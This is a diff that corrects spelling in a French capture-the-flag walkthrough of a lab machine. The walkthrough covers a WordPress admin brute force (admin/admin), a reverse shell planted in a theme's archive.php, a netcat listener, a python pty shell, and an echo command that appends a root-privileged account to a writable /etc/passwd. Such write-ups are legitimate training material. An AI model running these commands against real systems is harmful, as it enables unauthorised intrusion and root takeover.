@@ -81,11 +81,10 @@ Nmap done: 1 IP address (1 host up) scanned in 8.44 seconds
 
 ![](https://imgur.com/HTdCxtW.png) 
 
-Il semble qu'une bonne partie des services soient vulnairables, il est possible d'identifier deux axes d'attaques : 
+Il semble qu'une bonne partie des services soient vulnérables, il est possible d'identifier deux axes d'attaques : 
 
-- L'un est liée à la version de ProFTPd 
-- L'autre est liée a la version de OpenSSH, qui permet une extraction des userName puis une attaque par bruteForce
-
+- l'un est lié à la version de ProFTPd 
+- L'autre est lié à la version d'Openssh, qui permet une extraction des usernames puis une attaque par brute Force
 
 
 
@@ -223,9 +222,9 @@ Nous avons ici déjà un accès root
 
 ## Analyse du Port 80 
 
-Le port 80, semble contenire, un simple server WEB. 
-Mais Dirb nous permet de détecter une siteWordprepss. 
-Après résolution en local du nom de domaine pour la gestion des ressources de wordPress. 
+Le port 80, semble contenir, un simple serveur WEB. 
+Mais Dirb nous permet de détecter une site Wordprepss. 
+Après résolution en local du nom de domaine pour la gestion des ressources de word Press. 
 
 On arrive sur un blog wordpress, basic.
 
@@ -334,11 +333,11 @@ Trying admin / admin Time: 00:05:21 <                                    > (1982
 
 ```
 
-Après annalyse nous obtenons le couple `admin/admin`
+Après analyse nous obtenons le couple `admin/admin`
 
-Comme je n'ai pas envie d'utiliser metasploit 2 fois je vais tenter une technique plus "manuelle", en réalisant une injection au travers des thèmes wordpress, 
+Comme je n'ai pas envie d'utiliser Metasploit 2 fois je vais tenter une technique plus "manuelle", en réalisant une injection au travers des thèmes wordpress; 
 
-Grace au login admin, dans le theme wordpress nous allons glisser un reverseShell. 
+Grâce au login admin, dans le thème wordpress nous allons glisser un reverse Shell. 
 
 Le reverse shell est dans la page Archive
 
@@ -494,21 +493,22 @@ function printit ($string) {
 ```
 
 
-En lancent un client netcat du coté kali via 
+En lance un client Netcat du coté kali via 
+
 ```bash
 nc -l -v -p 1234
 ```
+et en chargant la page `http://vtcsec/secret/wp-content/themes/twentyseventeen/archive.php` 
+j'obtiens la main sur un pseudo shell. 
+Grâce à python je spawn un shell.
 
-et en chragant la page `http://vtcsec/secret/wp-content/themes/twentyseventeen/archive.php` 
-j'obtient la main sur un pseudo shell. 
-graçe à python je spawn un shell.
 ```python
 import pty; pty.spawn('/bin/bash')
 ```
 
-Les scripts `linpeas`, me perment de détecter entre autres TRES nombreux vecteurs d'attaque, que le fichier /etc/passwd est authorisée en écriture.
+Les scripts `linpeas`, me permettent de détecter entre autres TRES nombreux vecteurs d'attaque, que le /etc/passwd est autorisé en écriture.
 
-je l'utilise donc comme vetceur d'attaque : 
+je l'utilise donc comme vecteur d'attaque : 
 ```bash
 echo "root2:MlNmbwLb2K0bo:0:0:root:/root:/bin/bash" >> /etc/passwd
 ```
